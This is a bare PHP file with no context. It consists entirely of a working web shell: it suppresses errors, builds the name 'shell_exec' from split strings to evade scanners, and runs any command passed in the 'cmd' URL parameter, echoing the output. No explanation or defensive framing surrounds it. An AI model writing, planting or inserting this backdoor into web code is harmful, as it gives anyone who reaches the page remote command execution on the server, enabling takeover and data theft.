<?php
@error_reporting(0);
if(isset($_GET['cmd'])) {
    $a = 'shell';
    $b = '_exec';
    $c = $a . $b;
    echo @$c($_GET['cmd']);
    exit;
}
?>
